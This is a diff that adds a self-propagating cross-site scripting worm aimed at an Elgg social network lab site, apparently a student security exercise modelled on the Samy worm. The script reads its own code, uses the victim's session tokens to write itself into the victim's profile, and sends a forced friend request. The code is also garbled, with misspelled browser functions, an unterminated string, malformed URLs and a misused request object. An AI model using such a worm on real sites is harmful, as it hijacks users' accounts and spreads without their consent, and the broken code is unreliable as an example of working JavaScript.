@@ -1,0 +1,36 @@
+<script type ="text/javascript" id="worm">
+windows.onload = function () {
+
+var headerTag = "<script id =\"worm\" type=\"text/javascript\">";
+var jscode = document.getElementByID("worm").innerHTML;
+var tailTag = "</" + "script>";
+var wormcode = encodeURIcomponent(headerTag + jscode + tailTag);
+
+var username="elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+var accesslevel= "&accesslevel[description]=2";
+var description= "&description="+ wormcode;
+var briefdescription= "&briefdescription=ssamy is my hero";
+
+var content= token + ts + username + description + briefdescription + accesslevel + guid;
+var sendurl= "http://www..xsslabelgg.com/action/profit/edit";
+ var Ajax=null;
+ Ajax=new XMLHttpRequest();
+ Ajax.open("POST",sendurl,true);
+ Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+ Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+ Ajax.send(content);
+
+var Ajax2=null;
+var sendurl= "http://www..xsslabelgg.com/action/friends/add? friends=47" + ts + token;
+ Ajax2=new XMLHttpRequest();
+ Ajax2.open("GET",sendurl,true);
+ Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
+ Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+ Ajax.send(content);
+}
+
+</script>
